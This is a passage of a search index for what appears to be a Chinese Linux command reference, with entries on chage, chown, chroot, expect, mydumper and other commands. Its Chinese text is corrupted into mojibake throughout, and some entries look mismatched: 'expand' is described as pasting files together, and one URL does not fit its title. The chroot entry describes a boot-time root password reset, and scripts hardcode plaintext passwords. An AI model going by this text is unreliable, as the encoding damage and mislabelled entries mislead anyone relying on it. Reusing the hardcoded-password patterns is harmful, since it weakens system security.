ä¹‹é—´ç›¸è·çš„æœ€å°å¤©æ•° ï¼š0 ä¸¤æ¬¡æ”¹å˜å¯†ç ä¹‹é—´ç›¸è·çš„æœ€å¤§å¤©æ•° ï¼š60 åœ¨å¯†ç è¿‡æœŸä¹‹å‰è­¦å‘Šçš„å¤©æ•° ï¼š9 ç„¶åé€šè¿‡å¦‚ä¸‹å‘½ä»¤è®¾ç½®å¯†ç å¤±æ•ˆæ—¶é—´: [root@linuxde ~]# chage -I 5 root [root@linuxde ~]# chage -l root æœ€è¿‘ä¸€æ¬¡å¯†ç ä¿®æ”¹æ—¶é—´ ï¼š 3æœˆ 12, 2013 å¯†ç è¿‡æœŸæ—¶é—´ ï¼š 5æœˆ 11, 2013 å¯†ç å¤±æ•ˆæ—¶é—´ ï¼š 5æœˆ 16, 2013 å¸æˆ·è¿‡æœŸæ—¶é—´ ï¼šä»ä¸ ä¸¤æ¬¡æ”¹å˜å¯†ç ä¹‹é—´ç›¸è·çš„æœ€å°å¤©æ•° ï¼š0 ä¸¤æ¬¡æ”¹å˜å¯†ç ä¹‹é—´ç›¸è·çš„æœ€å¤§å¤©æ•° ï¼š60 åœ¨å¯†ç è¿‡æœŸä¹‹å‰è­¦å‘Šçš„å¤©æ•° ï¼š9 ä»ä¸Šè¿°å‘½ä»¤å¯ä»¥çœ‹åˆ°ï¼Œåœ¨å¯†ç è¿‡æœŸå5å¤©ï¼Œå¯†ç è‡ªåŠ¨å¤±æ•ˆï¼Œè¿™ä¸ªç”¨æˆ·å°†æ— æ³•ç™»é™†ç³»ç»Ÿäº†ã€‚","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-chage.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-chage.html"},{"title":"chown","text":"Linux chownï¼ˆchange ownerï¼‰ç”¨äºå˜æ›´æ–‡ä»¶æˆ–ç›®å½•çš„æ‹¥æœ‰è€…æˆ–æ‰€å±ç¾¤ç»„ è¯­æ³•: chown [-cfhvR] [--help] [--version] user[:group] file... é€‰é¡¹å‚æ•° -c æ˜¾ç¤ºæ›´æ”¹çš„éƒ¨åˆ†çš„ä¿¡æ¯ -f å¿½ç•¥é”™è¯¯ä¿¡æ¯ -h ä¿®å¤ç¬¦å·é“¾æ¥ -v æ˜¾ç¤ºè¯¦ç»†çš„å¤„ç†ä¿¡æ¯ -R å¤„ç†æŒ‡å®šç›®å½•ä»¥åŠå…¶å­ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ --help æ˜¾ç¤ºè¾…åŠ©è¯´æ˜ --version æ˜¾ç¤ºç‰ˆæœ¬ -f , --quite , --silent ä¸æ˜¾ç¤ºé”™è¯¯ä¿¡æ¯ --reference= <file> ä½¿ç”¨ file æ–‡ä»¶çš„æ‰€æœ‰è€…å’Œç»„, è€Œä¸æ˜¯æŒ‡å®šçš„ user:group å…¶ä»–: user : æ–°çš„æ–‡ä»¶æ‹¥æœ‰è€…çš„ä½¿ç”¨è€… ID group : æ–°çš„æ–‡ä»¶æ‹¥æœ‰è€…çš„ä½¿ç”¨è€…ç»„(group) è¯´æ˜: #user:group æŒ‡å®šæ‰€æœ‰è€…å’Œæ‰€å±å·¥ä½œgroupã€‚å½“çœç•¥\":group\"ï¼Œä»…æ”¹å˜æ–‡ä»¶æ‰€æœ‰è€… #æ–‡ä»¶: æŒ‡å®šè¦æ”¹å˜æ‰€æœ‰è€…å’Œå·¥ä½œgroupçš„æ–‡ä»¶åˆ—è¡¨ã€‚æ”¯æŒå¤šä¸ªæ–‡ä»¶å’Œç›®æ ‡ï¼Œæ”¯æŒshellé€šé…ç¬¦ã€‚ chown -R user:group file","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-chown.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-chown.html"},{"title":"chpasswd","text":"è¯»å–æœªåŠ å¯†çš„å¯†ç ï¼Œç„¶åå°†åŠ å¯†åçš„å¯†ç å†™å…¥ /etc/shadow: echo 'qwe123' | chpasswd","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-chpasswd.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-chpasswd.html"},{"title":"chroot","text":"å‚è€ƒ: https://www.cnblogs.com/sparkdev/p/8556075.html å³ change root directory (æ›´æ”¹ root ç›®å½•)ã€‚ åœ¨ linux ç³»ç»Ÿä¸­ï¼Œç³»ç»Ÿé»˜è®¤çš„ç›®å½•ç»“æ„éƒ½æ˜¯ä»¥ /ï¼Œå³ä»¥æ ¹ (root) å¼€å§‹çš„ã€‚ è€Œåœ¨ä½¿ç”¨ chroot ä¹‹åï¼Œç³»ç»Ÿçš„ç›®å½•ç»“æ„å°†ä»¥æŒ‡å®šçš„ä½ç½®ä½œä¸º / ä½ç½®ã€‚ å¯ä»¥ç”¨å®ƒæ¥ç®€å•çš„å®ç°æ–‡ä»¶ç³»ç»Ÿçš„éš”ç¦»ã€‚ ä½†åœ¨ä¸€ä¸ªå®¹å™¨æŠ€æœ¯ç¹è£çš„æ—¶ä»£ï¼Œç”¨ chroot æ¥è¿›è¡Œèµ„æºçš„éš”ç¦»å®åœ¨æ˜¯ low äº†ç‚¹ã€‚ æ‰€ä»¥ chroot çš„ä¸»è¦ç”¨é€”è¿˜æ˜¯é›†ä¸­åœ¨ç³»ç»Ÿæ•‘æ´ã€ç»´æŠ¤ç­‰ä¸€äº›ç‰¹æ®Šçš„åœºæ™¯ä¸­ã€‚ è¯­æ³•: chroot NEWROOT [COMMAND [ARG]...] ä¸ºä»€ä¹ˆè¦ä½¿ç”¨ chroot å‘½ä»¤ å¢åŠ äº†ç³»ç»Ÿçš„å®‰å…¨æ€§ï¼Œé™åˆ¶äº†ç”¨æˆ·çš„æƒåŠ›: åœ¨ç»è¿‡ chroot ä¹‹åï¼Œåœ¨æ–°æ ¹ä¸‹å°†è®¿é—®ä¸åˆ°æ—§ç³»ç»Ÿçš„æ ¹ç›®å½•ç»“æ„å’Œæ–‡ä»¶ï¼Œè¿™æ ·å°±å¢å¼ºäº†ç³»ç»Ÿçš„å®‰å…¨æ€§ã€‚ ä¸€èˆ¬ä¼šåœ¨ç”¨æˆ·ç™»å½•å‰åº”ç”¨ chrootï¼ŒæŠŠç”¨æˆ·çš„è®¿é—®èƒ½åŠ›æ§åˆ¶åœ¨ä¸€å®šçš„èŒƒå›´ä¹‹å†…ã€‚ å»ºç«‹ä¸€ä¸ªä¸åŸç³»ç»Ÿéš”ç¦»çš„ç³»ç»Ÿç›®å½•ç»“æ„ï¼Œæ–¹ä¾¿ç”¨æˆ·çš„å¼€å‘: ä½¿ç”¨ chroot åï¼Œç³»ç»Ÿè¯»å–çš„æ˜¯æ–°æ ¹ä¸‹çš„ç›®å½•å’Œæ–‡ä»¶ï¼Œè¿™æ˜¯ä¸€ä¸ªä¸åŸç³»ç»Ÿæ ¹ä¸‹æ–‡ä»¶ä¸ç›¸å…³çš„ç›®å½•ç»“æ„ã€‚ åœ¨è¿™ä¸ªæ–°çš„ç¯å¢ƒä¸­ï¼Œå¯ä»¥ç”¨æ¥æµ‹è¯•è½¯ä»¶çš„é™æ€ç¼–è¯‘ä»¥åŠä¸€äº›ä¸ç³»ç»Ÿä¸ç›¸å…³çš„ç‹¬ç«‹å¼€å‘ã€‚ åˆ‡æ¢ç³»ç»Ÿçš„æ ¹ç›®å½•ä½ç½®ï¼Œå¼•å¯¼ Linux ç³»ç»Ÿå¯åŠ¨ä»¥åŠæ€¥æ•‘ç³»ç»Ÿç­‰: chroot çš„ä½œç”¨å°±æ˜¯åˆ‡æ¢ç³»ç»Ÿçš„æ ¹ä½ç½®ï¼Œè€Œè¿™ä¸ªä½œç”¨æœ€ä¸ºæ˜æ˜¾çš„æ˜¯åœ¨ç³»ç»Ÿåˆå§‹å¼•å¯¼ç£ç›˜çš„å¤„ç†è¿‡ç¨‹ä¸­ä½¿ç”¨ï¼Œ ä»åˆå§‹ RAM ç£ç›˜ (initrd) åˆ‡æ¢ç³»ç»Ÿçš„æ ¹ä½ç½®å¹¶æ‰§è¡ŒçœŸæ­£çš„ init. æ¯”å¦‚æ–‡æœ«çš„ç”¨ä¾‹. å‚æ•°é€‰é¡¹ å¦‚æœä¸ç»™ chroot æŒ‡å®šæ‰§è¡Œçš„å‘½ä»¤ï¼Œé»˜è®¤å®ƒä¼šæ‰§è¡Œ '${SHELL} -i'ï¼Œè€Œæˆ‘çš„ç³»ç»Ÿä¸­ ${SHELL} ä¸º /bin/bashã€‚ é€šè¿‡ chroot è¿è¡Œ busybox å·¥å…· busybox åŒ…å«äº†ä¸°å¯Œçš„å·¥å…·ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠè¿™äº›å·¥å…·æ”¾ç½®åœ¨ä¸€ä¸ªç›®å½•ä¸‹ï¼Œç„¶åé€šè¿‡ chroot æ„é€ å‡ºä¸€ä¸ª mini ç³»ç»Ÿã€‚ ç®€å•èµ·è§æˆ‘ä»¬ç›´æ¥ä½¿ç”¨ docker çš„ busybox é•œåƒæ‰“åŒ…çš„æ–‡ä»¶ç³»ç»Ÿã€‚å…ˆåœ¨å½“å‰ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªç›®å½• rootfs: $ mkdir rootfs ç„¶åæŠŠ busybox é•œåƒä¸­çš„æ–‡ä»¶é‡Šæ”¾åˆ°è¿™ä¸ªç›®å½•ä¸­: $ (docker export $(docker create busybox) | tar -C rootfs -xvf -) é€šè¿‡ ls å‘½ä»¤æŸ¥çœ‹ rootfs æ–‡ä»¶å¤¹ä¸‹çš„å†…å®¹: $ ls rootfs æ‰§è¡Œ chroot åçš„ ls å‘½ä»¤: $ sudo chroot rootfs /bin/ls è™½ç„¶è¾“å‡ºç»“æœä¸åˆšæ‰æ‰§è¡Œçš„ ls rootfs å‘½ä»¤å½¢åŒï¼Œä½†æ˜¯è¿™æ¬¡è¿è¡Œçš„å‘½ä»¤å´æ˜¯ rootfs/bin/lsã€‚ è¿è¡Œ chroot åçš„ pwd å‘½ä»¤: $ sudo chroot rootfs /bin/pwd / å¯ä»¥çœ‹å‡ºç›´æ¥æŠŠrootfså½“ä½œæ ¹ç›®å½•. æ£€æŸ¥ç¨‹åºæ˜¯å¦è¿è¡Œåœ¨ chroot ç¯å¢ƒä¸‹ é€šè¿‡ /proc ç›®å½•ä¸‹çš„æ–‡ä»¶æ£€æŸ¥è¿›ç¨‹çš„ä¸­çš„æ ¹ç›®å½• å¦‚å½“æ‰“å¼€ä¸€ä¸ªshä¼šè¯: sudo chroot rootfs /bin/sh æ£€æŸ¥/bin/shæ ¹ç›®å½•: pid=$(pidof -s sh) sudo ls -ld /proc/$pid/root ç»“æœä¼šæ‰“å°å®é™…çš„é“¾æ¥åœ°å€. å®ä¾‹ï¼šé€šè¿‡ chroot é‡æ–°è®¾ç½® root å¯†ç  systemd çš„ç®¡ç†æœºåˆ¶ä¸­ï¼Œrescure æ¨¡å¼å’Œ emeryency æ¨¡å¼æ˜¯æ— æ³•ç›´æ¥å–å¾— root æƒé™çš„ï¼Œ éœ€è¦ä½¿ç”¨ root å¯†ç æ‰èƒ½è¿›å…¥ rescure å’Œ emeryency ç¯å¢ƒã€‚ å¯ä»¥ä¸ºå†…æ ¸çš„å¯åŠ¨æŒ‡å®š \"rd.break\" å‚æ•°ï¼Œä»è€Œè®©ç³»ç»Ÿåœ¨å¯åŠ¨çš„æ—©æœŸåœä¸‹æ¥ï¼Œ æ­¤æ—¶æˆ‘ä»¬å¯ä»¥é€šè¿‡ä½¿ç”¨ root æƒé™å¹¶ç»“åˆ chroot å‘½ä»¤å®Œæˆè®¾ç½® root å¯†ç çš„æ“ä½œã€‚ åœ¨ç³»ç»Ÿå¯åŠ¨è¿‡ç¨‹ä¸­è¿›å…¥å¼€æœºèœå•æ—¶æŒ‰ä¸‹å­—æ¯é”® e è¿›ç¨‹å¼€æœºèœå•çš„ç¼–è¾‘æ¨¡å¼ æ‰¾åˆ°ä»¥ \"linux16 /vmlinuz-\" å¼€å¤´çš„è¡Œã€‚å¦‚æœé»˜è®¤æ²¡æœ‰çœ‹åˆ°è¯¥è¡Œï¼Œéœ€è¦æŒ‰å‘ä¸‹é”®æŠŠå®ƒæ»šåŠ¨å‡ºæ¥ã€‚ ç„¶åå®šä½åˆ°è¯¥è¡Œç»“å°¾å¤„ï¼Œè¾“å…¥ä¸€ä¸ªç©ºæ ¼å’Œå­—ç¬¦ä¸² \" rd.break\" æ¥ç€æŒ‰ä¸‹ ctrl + x ä»¥è¯¥è®¾ç½®ç»§ç»­å¯åŠ¨ï¼Œå¯åŠ¨è¿‡ç¨‹ä¸­æ“ä½œç³»ç»Ÿä¼šåœä¸‹æ¥ï¼Œè¿™æ˜¯ç³»ç»Ÿå¯åŠ¨è¿‡ç¨‹ä¸­çš„ä¸€ä¸ªéå¸¸æ—©çš„æ—¶é—´ç‚¹ æ‰€ä»¥ç³»ç»Ÿçš„æ ¹ç›®å½•è¿˜æŒ‚è½½åœ¨ RAM disk ä¸Š(å°±æ˜¯å†…å­˜ä¸­çš„ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿ)ï¼Œ æˆ‘ä»¬å¯ä»¥é€šè¿‡ mount å‘½ä»¤æ£€æŸ¥ç³»ç»Ÿå½“å‰æŒ‚è½½çš„æ–‡ä»¶ç³»ç»Ÿ: mount è¯¥æ—¶é—´ç‚¹çš„æœ€å¤§ä¼˜åŠ¿æ˜¯æˆ‘ä»¬å…·æœ‰ root æƒé™ï¼å¼€å§‹è®¾ç½®æ–°çš„ root å¯†ç ã€‚ æŠŠ /sysroot é‡æ–°æŒ‚è½½ä¸º å¯è¯»å†™çš„æ¨¡å¼: mount -o remount,rw /sysroot chroot å‘½ä»¤æŠŠæ ¹ç›®å½•åˆ‡æ¢åˆ°æˆ‘ä»¬åŸæ¥çš„ ç¯å¢ƒä¸­: chroot /sysroot æ­¤æ—¶å¯ä»¥ç†è§£ä¸ºï¼šæˆ‘ä»¬ä»¥ root æƒé™ç™»å½•äº†åŸæ¥çš„ç³»ç»Ÿï¼Œä¿®æ”¹å¯†ç å°±å¾ˆå®¹æ˜“ ä¸º root ç”¨æˆ·è®¾ç½®æ–°çš„ å¯†ç : echo \"new_root_pw\" | passwd --stdin root æ¥ä¸‹æ¥è¿˜è¦å¤„ç† SELinux ç›¸å…³çš„é—®é¢˜ã€‚ç”±äºå½“å‰çš„ç¯å¢ƒä¸­ SELinux å¹¶æœªå¯åŠ¨ï¼Œ æ‰€ä»¥æˆ‘ä»¬å¯¹æ–‡ä»¶çš„ä¿®æ”¹å¯èƒ½é€ æˆæ–‡ä»¶çš„ context ä¸æ­£ç¡®ã€‚ ä¸ºäº†ç¡®ä¿å¼€æœºæ—¶é‡æ–°è®¾å®š SELinux contextï¼Œå¿…é ˆåœ¨æ ¹ç›®å½•ä¸‹æ·»åŠ éšè—æ–‡ä»¶ .autorelabel: touch /.autorelabel ä» chroot ä¸­é€€å‡ºï¼Œ å¹¶é‡å¯ç³»ç»Ÿ: exit reboot é‡æ–°è¿›å…¥ç™»é™†ç•Œé¢æ—¶å°±å¯ä»¥ä½¿ç”¨åˆšæ‰è®¾ç½®çš„å¯†ç ä»¥ root ç™»é™†äº†","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-chroot.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-chroot.html"},{"title":"col","text":"-x å°†tabæ›¿æ¢ä¸ºç©ºæ ¼","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-col.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-col.html"},{"title":"dirname","text":"ç›¸å…³æŒ‡ä»¤: /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/basename","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-dirname.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-dirname.html"},{"title":"sz","text":"ä¸‹è½½ç»ˆç«¯æ–‡ä»¶åˆ°æœ¬åœ° ç›¸å…³æŒ‡ä»¤ rz","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-even.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-even.html"},{"title":"expect","text":"é€šè¿‡expectå¯ä»¥å®ç°å°†äº¤äº’å¼çš„å‘½ä»¤å˜ä¸ºéäº¤äº’å¼æ‰§è¡Œï¼Œä¸éœ€è¦äººä¸ºå¹²é¢„(æ‰‹åŠ¨è¾“å…¥) ç”¨æ³• option å«ä¹‰ set timeout 30 è®¾ç½®è¶…æ—¶æ—¶é—´30s spawn ${cmd} spawnæ˜¯æ‰§è¡Œexpectä¹‹ååæ‰§è¡Œçš„å†…éƒ¨å‘½ä»¤å¼€å¯ä¸€ä¸ªä¼šè¯ #åŠŸèƒ½:ç”¨æ¥æ‰§è¡Œshellçš„äº¤äº’å‘½ä»¤ expect ç›¸å½“äºæ•æ‰ send æ‰§è¡Œäº¤äº’åŠ¨ä½œï¼Œå°†äº¤äº’è¦æ‰§è¡Œçš„å‘½ä»¤è¿›è¡Œå‘é€ç»™äº¤äº’æŒ‡ä»¤ï¼Œå‘½ä»¤å­—ç¬¦ä¸²ç»“å°¾è¦åŠ ä¸Š\"r\"ï¼Œ#---ç›¸å½“äºå›è½¦ interact æ‰§è¡Œå®Œåä¿æŒäº¤äº’çŠ¶æ€ï¼Œéœ€è¦ç­‰å¾…æ‰‹åŠ¨é€€å‡ºäº¤äº’çŠ¶æ€ï¼Œå¦‚æœä¸åŠ è¿™ä¸€é¡¹ï¼Œäº¤äº’å®Œæˆä¼šè‡ªåŠ¨é€€å‡º exp_continue ç»§ç»­æ‰§è¡Œæ¥ä¸‹æ¥çš„æ“ä½œ å®æˆ˜éäº¤äº’å¼sshè¿æ¥: [root@qfedu script]# vim test.sh #!/bin/sh expect -c \" set timeout 10 spawn ssh root@localhost expect { \\\"yes/no\\\" { send \\\"yes\\r\\\"; exp_continue } \\\"password:\\\" { send \\\"root\\r\\\" } } \" #æ³¨æ„èŠ±æ‹¬å·å‰ä¸€å®šè¦æœ‰ç©ºæ ¼ [root@qfedu script]# chmod +x test.sh [root@qfedu script]# ./test.sh spawn ssh root@localhost root@localhost's password: Last login: Fri Aug 28 16:57:09 2019 #å¦‚æœæ·»åŠ interactå‚æ•°å°†ä¼šç­‰å¾…æˆ‘ä»¬æ‰‹åŠ¨äº¤äº’è¿›è¡Œé€€å‡ºã€‚å¦‚æœä¸åŠ interactå‚æ•°åœ¨ç™»å½•æˆåŠŸä¹‹åä¼šç«‹åˆ»é€€å‡ºã€‚","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-exfect.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-exfect.html"},{"title":"expand","text":"å°†ä¸¤ä¸ªæ–‡ä»¶ç›¸åŒè¡Œçš„æ•°æ®ç²˜åœ¨ä¸€èµ·ï¼Œä»¥ç©ºæ ¼éš”å¼€ ç›¸ä¼¼æŒ‡ä»¤ paste","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-expand.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-expand.html"},{"title":"export","text":"exportç”¨äºè®¾ç½®æˆ–æ˜¾ç¤ºç¯å¢ƒå˜é‡, æ˜¾ç¤ºå½“å‰å¯¼å‡ºæˆç”¨æˆ·å˜é‡çš„shellå˜é‡(å¯ä»¥åœ¨å½“å‰shellä»¥åŠå­shellä¸­ä½¿ç”¨çš„å˜é‡): -p åˆ—å‡ºæ‰€æœ‰shellèµ‹äºˆç¨‹åºçš„ç¯å¢ƒå˜é‡ -n åˆ é™¤æŒ‡å®šçš„ç¯å¢ƒå˜é‡ã€‚å®é™…å¹¶æœªåˆ é™¤ï¼Œåªæ˜¯ä¸ä¼šè¾“å‡ºåˆ°åç»­æŒ‡ä»¤çš„æ‰§è¡Œç¯å¢ƒä¸­ -f ä»£è¡¨[å˜é‡åç§°]ä¸­ä¸ºå‡½æ•°åç§° è¿˜æœ‰ä¸€ä¸ªç‰¹æ®Šçš„ä½œç”¨æ˜¯, ä½¿ç”¨exportå¯¼å‡ºå, ä¿®æ”¹åçš„ç¯å¢ƒå˜é‡æ‰å¯¹å­è¿›ç¨‹å¯è§, å¦‚æ›´æ–° PATHç¯å¢ƒå˜é‡, è‹¥åªè®¾ç½®: PATH=\"/usr/local/new_path:$PATH\" åˆ™ç”Ÿæ•ˆèŒƒå›´åªæœ‰å½“å‰shell, ä½¿ç”¨: export PATH=$PATH åæ‰èƒ½å¯¹å­è¿›ç¨‹å¯è§ æ›´è§„èŒƒçš„è¯´æ³•: å°†ä¸€ä¸ªshellç§æœ‰å˜é‡ä½¿ç”¨exportå¯¼å‡º, ä½¿å…¶æå‡ä¸ºç”¨æˆ·å˜é‡.","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-export.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-export.html"},{"title":"free","text":"æ˜¾ç¤ºå†…å­˜çš„ä½¿ç”¨æƒ…å†µ -b ä»¥Byteä¸ºå•ä½æ˜¾ç¤ºå†…å­˜ä½¿ç”¨æƒ…å†µï¼› -k ä»¥KBä¸ºå•ä½æ˜¾ç¤ºå†…å­˜ä½¿ç”¨æƒ…å†µï¼› -m ä»¥MBä¸ºå•ä½æ˜¾ç¤ºå†…å­˜ä½¿ç”¨æƒ…å†µï¼› -g ä»¥GBä¸ºå•ä½æ˜¾ç¤ºå†…å­˜ä½¿ç”¨æƒ…å†µã€‚ -o ä¸æ˜¾ç¤ºç¼“å†²åŒºè°ƒèŠ‚åˆ—ï¼› -s <é—´éš”ç§’æ•°> æŒç»­è§‚å¯Ÿå†…å­˜ä½¿ç”¨çŠ¶å†µï¼› -t æ˜¾ç¤ºå†…å­˜æ€»å’Œåˆ—ï¼› -V æ˜¾ç¤ºç‰ˆæœ¬ä¿¡æ¯ã€‚","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-free.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-free.html"},{"title":"head","text":"æ˜¾ç¤ºæ–‡ä»¶çš„å¼€å¤´éƒ¨åˆ†ã€‚ -n, --lines=[-]NUM æ˜¾ç¤ºå‰NUMè¡Œè€Œä¸æ˜¯é»˜è®¤çš„10è¡Œï¼› å¦‚æœNUMå‰æœ‰\"-\"ï¼Œé‚£ä¹ˆä¼šæ‰“å°é™¤äº†æ–‡ä»¶æœ«å°¾çš„NUMè¡Œä»¥å¤–çš„å…¶ä»–è¡Œã€‚","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-head.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-head.html"},{"title":"host","text":"æŸ¥å‡ºæŸä¸ªä¸»æœºçš„ip ç”¨æ³•: host [-a] hostname [server] é€‰é¡¹ä¸å‚æ•°: -a åˆ—è¯¥ä¸»æœºè¯¦ç»†çš„å„é¡¹ä¸»æœºåè®¾å®šæ•°æ® [server] å¯ä»¥ä½¿ç”¨éä¸º /etc/resolv.cnf çš„DNS æœåŠ¡å™¨","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-host.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-host.html"},{"title":"locale","text":"è®¾ç½®ç³»ç»Ÿè¯­è¨€ç¯å¢ƒ ä¸å¸¦å‚æ•°æ˜¯æŸ¥çœ‹å·²è®¾ç½®å­—ç¬¦é›† -a æŸ¥çœ‹å·²å®‰è£…æœ‰å­—ç¬¦é›†","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-locale.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-locale.html"},{"title":"mkfifo","text":"åˆ›å»ºä¸€ä¸ªå‘½ä»¤ç®¡é“ï¼ˆFIFOï¼‰æ–‡ä»¶ å¯ä»¥é€šè¿‡ stdbuf -oL æ¥è¡Œç¼“å†²è¯»å–","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-mkfifo.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-mkfifo.html"},{"title":"mydumper","text":"æ•°æ®åº“å¤‡ä»½æŒ‡ä»¤ -B , --database è¦å¤‡ä»½çš„æ•°æ®åº“ï¼Œä¸æŒ‡å®šåˆ™å¤‡ä»½æ‰€æœ‰åº“ -T , --tables-list éœ€è¦å¤‡ä»½çš„è¡¨ï¼Œåå­—ç”¨é€—å·éš”å¼€ -o , --outputdir å¤‡ä»½æ–‡ä»¶è¾“å‡ºçš„ç›®å½• -s , --statement-size ç”Ÿæˆçš„insertè¯­å¥çš„å­—èŠ‚æ•°ï¼Œé»˜è®¤1000000 -r , --rows å°†è¡¨æŒ‰è¡Œåˆ†å—æ—¶ï¼ŒæŒ‡å®šçš„å—è¡Œæ•°ï¼ŒæŒ‡å®šè¿™ä¸ªé€‰é¡¹ä¼šå…³é—­ --chunk-filesize -F , --chunk-filesize å°†è¡¨æŒ‰å¤§å°åˆ†å—æ—¶ï¼ŒæŒ‡å®šçš„å—å¤§å°ï¼Œå•ä½æ˜¯ MB -c , --compress å‹ç¼©è¾“å‡ºæ–‡ä»¶ -e , --build-empty-files å¦‚æœè¡¨æ•°æ®æ˜¯ç©ºï¼Œè¿˜æ˜¯äº§ç”Ÿä¸€ä¸ªç©ºæ–‡ä»¶ï¼ˆé»˜è®¤æ— æ•°æ®åˆ™åªæœ‰è¡¨ç»“æ„æ–‡ä»¶ï¼‰ -x , --regex æ˜¯åŒæ­£åˆ™è¡¨è¾¾å¼åŒ¹é… 'db.table' -i , --ignore-engines å¿½ç•¥çš„å­˜å‚¨å¼•æ“ï¼Œç”¨éƒ½åšåˆ†å‰² -m , --no-schemas ä¸å¤‡ä»½è¡¨ç»“æ„ -k , --no-locks ä¸ä½¿ç”¨ä¸´æ—¶å…±äº«åªè¯»é”ï¼Œä½¿ç”¨è¿™ä¸ªé€‰é¡¹ä¼šé€ æˆæ•°æ®ä¸ä¸€è‡´ --less-locking å‡å°‘å¯¹InnoDBè¡¨çš„é”æ–½åŠ æ—¶é—´ï¼ˆè¿™ç§æ¨¡å¼çš„æœºåˆ¶ä¸‹æ–‡è¯¦è§£ï¼‰ -l , --long-query-guard è®¾å®šé˜»å¡å¤‡ä»½çš„é•¿æŸ¥è¯¢è¶…æ—¶æ—¶é—´ï¼Œå•ä½æ˜¯ç§’ï¼Œé»˜è®¤æ˜¯60ç§’ï¼ˆè¶…æ—¶åé»˜è®¤mydumperå°†ä¼šé€€å‡ºï¼‰ --kill-long-queries æ€æ‰é•¿æŸ¥è¯¢ (ä¸é€€å‡º) -b , --binlogs å¯¼å‡ºbinlog -D , --daemon å¯ç”¨å®ˆæŠ¤è¿›ç¨‹æ¨¡å¼ï¼Œå®ˆæŠ¤è¿›ç¨‹æ¨¡å¼ä»¥æŸä¸ªé—´éš”ä¸é—´æ–­å¯¹æ•°æ®åº“è¿›è¡Œå¤‡ä»½ -I , --snapshot-interval dumpå¿«ç…§é—´éš”æ—¶é—´ï¼Œé»˜è®¤60sï¼Œéœ€è¦åœ¨daemonæ¨¡å¼ä¸‹ -L , --logfile ä½¿ç”¨çš„æ—¥å¿—æ–‡ä»¶å(mydumperæ‰€äº§ç”Ÿçš„æ—¥å¿—), é»˜è®¤ä½¿ç”¨æ ‡å‡†è¾“å‡º --tz-utc è·¨æ—¶åŒºæ˜¯ä½¿ç”¨çš„é€‰é¡¹ï¼Œä¸è§£é‡Šäº† --skip-tz-utc åŒä¸Š --use-savepoints ä½¿ç”¨savepointsæ¥å‡å°‘é‡‡é›†metadataæ‰€é€ æˆçš„é”æ—¶é—´ï¼Œéœ€è¦ SUPER æƒé™ --success-on-1146 Not increment error count and Warning instead of Critical in case of table doesn't exist -h , --host è¿æ¥çš„ä¸»æœºå -u , --user å¤‡ä»½æ‰€ä½¿ç”¨çš„ç”¨æˆ· -p , --password å¯†ç  -P , --port ç«¯å£ -S , --socket ä½¿ç”¨socketé€šä¿¡æ—¶çš„socketæ–‡ä»¶ -t , --threads å¼€å¯çš„å¤‡ä»½çº¿ç¨‹æ•°ï¼Œé»˜è®¤æ˜¯4 -C , --compress-protocol å‹ç¼©ä¸mysqlé€šä¿¡çš„æ•°æ® -V , --version æ˜¾ç¤ºç‰ˆæœ¬å· -v , --verbose è¾“å‡ºä¿¡æ¯æ¨¡å¼, 0 = silent, 1 = errors, 2 = warnings, 3 = info, é»˜è®¤ä¸º 2 ç›¸å…³æŒ‡ä»¤ myloader , ç”¨äºæ•°æ®æ¢å¤","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-mydumper.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-mydumper.html"},{"title":"myloader","text":"æ•°æ®æ¢å¤ -d , --directory å¤‡ä»½æ–‡ä»¶çš„æ–‡ä»¶å¤¹ -q , --queries-per-transaction æ¯æ¬¡äº‹ç‰©æ‰§è¡Œçš„æŸ¥è¯¢æ•°é‡ï¼Œé»˜è®¤æ˜¯1000 -o , 